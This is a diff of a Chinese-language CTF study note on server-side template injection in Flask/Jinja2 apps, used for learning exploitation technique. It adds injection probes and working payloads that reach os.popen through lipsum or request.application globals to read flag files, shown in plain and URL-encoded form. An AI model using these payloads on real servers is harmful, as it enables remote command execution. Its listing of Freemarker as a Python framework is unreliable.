@@ -1,3 +1,10 @@
+---
+title: PYTHON题目相关知识
+categories: 
+tags:
+---
+
+
 ## Python相关
 
 ### Flash SSTI
@@ -8,7 +15,22 @@ SSTI Server-Side Template Injection，由于接受用户输入处理不完善而
 
 使用 `{{ 7*7 }}` 判断是否能注入，如果能计算出结果，则存在诸如的可能。
 
+Python中不同的Web框架，检测注入可能的方法不一样
+* Jinja2：`{{7*7}}`
+* Freemarker：`${7*7}`
+* Flask：`{{7*7}}`
+
 使用 `{{config}}` 尝试获取配置信息。
+
+使用 `{{__class__.__init__.__globals__}}` 访问全局命名空间
+
+`{{lipsum.__globals__['__builtins__']['__import__']('os').popen('cat /app/flag').read()}}`
+有的时候发送请求会提示400 错误的请求，这时对内容进行 url 编码
+`%7B%7Blipsum.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D%28%27os%27%29.popen%28%27cat%20/app/flag%27%29.read%28%29%7D%7D`
+
+如果 lipsum 被过滤，可以尝试 requests
+`{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}`
+`%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27cat%20/flag%27%29.read%28%29%7D%7D`
 
 再进一步的通过执行命令，获取保存在服务器文件中的 flag 信息。
 
